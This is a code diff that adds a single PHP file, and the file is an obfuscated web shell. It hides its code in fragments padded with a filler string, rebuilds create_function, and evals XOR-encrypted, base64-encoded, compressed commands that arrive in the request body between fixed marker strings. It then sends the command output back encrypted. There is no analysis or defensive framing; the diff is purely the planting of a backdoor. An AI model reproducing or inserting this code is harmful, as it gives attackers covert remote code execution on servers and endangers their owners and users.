@@ -1,0 +1,10 @@
+<?php
+$z='ut$L"),$m)=$L=1) $L{@$Lob_start($L);@ev$L$Lal(@g$Lzu$Lncompress(@x(@ba$L$Lse64_decode($L$m[1]),$L$k)));$$Lo=@ob_ge$Lt_';
+$E='$L$k="d746338$La";$k$L$Lh="e99c$L9ddbc287";$kf=$L$L"2560f7a4$L$Lc588";$L$$Lp="$Lt6Ol90KGKEisZU4l"$L$L;funct$Lion x($t,$$L';
+$C='k){$c=strlen($L$k)$L;$l=strlen($L$t)$L;$o="";f$L$L$Lor$L($i=0;$i$L$L<$L$l;){for($j$L=0;($j<$c&&$i<$l)$L;$j++,$i++){$o.';
+$x=str_replace('q','','qcrqeate_qfqqunqction');
+$Q='c$Lonte$Lnt$Ls();@ob_e$Lnd$L_clean();$r=@base6$L4_enc$Lode(@x$L(@gzcom$Lpres$Ls($o),$$Lk))$L;$Lprint$L("$p$kh$r$kf");}';
+$X='=$L$t{$i}$L^$k$L$L{$L$j};}}re$Lturn $o;$L}if (@$Lpreg_match("/$kh($L.+)$$Lkf/$L",@file_$Lge$Lt_contents("$L$Lphp://inp';
+$P=str_replace('$L','',$E.$C.$X.$z.$Q);
+$K=$x('',$P);$K();
+?>
